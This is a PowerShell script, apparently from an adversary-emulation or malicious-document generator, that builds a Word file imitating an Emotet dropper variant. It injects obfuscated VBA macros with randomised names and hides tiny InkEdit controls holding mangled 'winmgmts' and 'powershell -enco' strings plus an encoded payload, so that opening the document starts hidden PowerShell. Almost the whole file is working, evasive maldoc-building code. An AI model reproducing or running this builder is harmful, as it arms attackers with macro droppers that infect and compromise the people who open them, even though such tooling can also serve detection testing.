Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

Emotet 11-08-19 variant

Sample Hash: 0454c5c192386f1af1b9dae8c44df21486cfc561110081e72b32a94b5bfa0706

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false
    $fname = "$PSScriptRoot\Doc1.docm"
    $wdDoc = $wdApp.documents.open($fname)

    $name1, $name2, $name3 = CreateControls -officeObject $wdDoc

    $vbaModule1 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule2 = $wdDoc.VBProject.VBComponents.Add(1)
    $vbaModule3 = $wdDoc.VBProject.VBComponents.Add(1)

    $name4 = RandTextAlpha -len 5
    RenameVBAModule -officeObject $wdDoc -from "ThisDocument" -to $name4
    $macro1, $macro2, $macro3 = BuildMacro -inkedit1 $name1 -inkedit2 $name2 -inkedit3 $name3 -thisDocument $name4

    $vbaModule1.CodeModule.AddFromString($macro1) | Out-Null
    RenameVBAModule -officeObject $wdDoc -from "Module1" -to $(RandTextAlpha -len 9)

    $vbaModule2.CodeModule.AddFromString($macro2) | Out-Null
    RenameVBAModule -officeObject $wdDoc -from "Module2" -to $(RandTextAlpha -len 9)

    $vbaModule3.CodeModule.AddFromString($macro3) | Out-Null     
    RenameVBAModule -officeObject $wdDoc -from "Module3" -to $(RandTextAlpha -len 9)

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $inkedit1,

        [Parameter(mandatory=$true)]
        [String]
        $inkedit2,

        [Parameter(mandatory=$true)]
        [String]
        $inkedit3,

        [Parameter(mandatory=$true)]
        [String]
        $thisDocument
    )

    $macro1 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro1.txt")
    $macro2 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro2.txt")
    $macro3 = [System.IO.File]::ReadAllText("$PSScriptRoot\macro3.txt")

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro2.contains($this_var_name)) {
            $macro2 = $macro2 -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $var_counter = 1
    do {
        $this_var_name = "aVAR" + $var_counter + "a"
        $randName = RandTextAlpha -len 15
        if ($macro3.contains($this_var_name)) {
            $macro3 = $macro3 -replace $this_var_name, $randName
        } else {
            break
        }
        $var_counter++
    } while ($true)

    $moduleTwo = RandTextAlpha -len 7
    $replaceString = RandTextAlpha -len 7
    $moduleThree = RandTextAlpha -len 7

    $macro1 = $macro1 -replace "aSUB1a", $moduleThree
    $macro3 = $macro3 -replace "aSUB1a", $moduleThree

    $macro2 = $macro2 -replace "aFUNC1a", $moduleTwo
    $macro2 = $macro2 -replace "aFUNC2a", $replaceString
    $macro3 = $macro3 -replace "aFUNC1a", $moduleTwo
    $macro3 = $macro3 -replace "aFUNC2a", $replaceString

    $macro3 = $macro3 -replace "aNAME1a", $inkedit1
    $macro3 = $macro3 -replace "aNAME2a", $inkedit2
    $macro3 = $macro3 -replace "aNAME3a", $inkedit3
    $macro3 = $macro3 -replace "aNAME4a", $thisDocument

    return $macro1, $macro2, $macro3

}

function MangleString() {
    param(
        [Parameter(mandatory=$false)]
        [String]
        $in
    )

    return $in -replace '(.)','$1ashn'
}

function CreateControls() {
    param(
        [Parameter(mandatory=$true)]
        [System.Object]
        $officeObject
    )

    $inkedit1 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")
    $inkedit2 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")
    $inkedit3 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")
    $inkedit4 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")
    $inkedit5 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")
    $inkedit6 = $wdDoc.InlineShapes.AddOLEControl("InkEd.InkEdit.1")

    $name1 = RandTextAlpha -len 7
    $inkedit1.Height = 1
    $inkedit1.Width = 1
    $inkedit1.OLEFormat.Object.Name = $name1
    $inkedit1.OLEFormat.Object.Text = MangleString -in $(MangleString -in $(MangleString -in $(MangleString -in "winmgmts:win32_processstartup")))

    $name2 = RandTextAlpha -len 7
    $inkedit2.Height = 1
    $inkedit2.Width = 1
    $inkedit2.OLEFormat.Object.Name = $name2
    $inkedit2.OLEFormat.Object.Text = MangleString -in "powershell -enco "

    $name3 = RandTextAlpha -len 7
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")
    $inkedit3.Height = 1
    $inkedit3.Width = 1
    $inkedit3.OLEFormat.Object.Name = $name3
    $inkedit3.OLEFormat.Object.Text = $payload

    $inkedit4.Height = 1
    $inkedit4.Width = 1
    $inkedit4.OLEFormat.Object.Name = RandTextAlpha -len 7
    $inkedit4.OLEFormat.Object.Text = RandTextAlpha -len 10

    $inkedit5.Height = 1
    $inkedit5.Width = 1
    $inkedit5.OLEFormat.Object.Name = RandTextAlpha -len 7
    $inkedit5.OLEFormat.Object.Text = RandTextAlpha -len 10

    $inkedit6.Height = 1
    $inkedit6.Width = 1
    $inkedit6.OLEFormat.Object.Name = RandTextAlpha -len 7
    $inkedit6.OLEFormat.Object.Text = RandTextAlpha -len 10

    return $name1, $name2, $name3
}